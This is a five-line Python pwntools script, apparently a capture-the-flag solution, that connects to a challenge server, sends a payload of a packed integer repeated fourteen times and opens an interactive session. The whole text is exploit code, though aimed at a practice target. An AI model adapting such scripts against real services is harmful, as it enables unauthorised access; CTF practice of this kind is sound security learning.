from pwn import *
sh = remote("node5.buuoj.cn",26776)
payload = p32(17)*14
sh.sendline(payload)
sh.interactive()
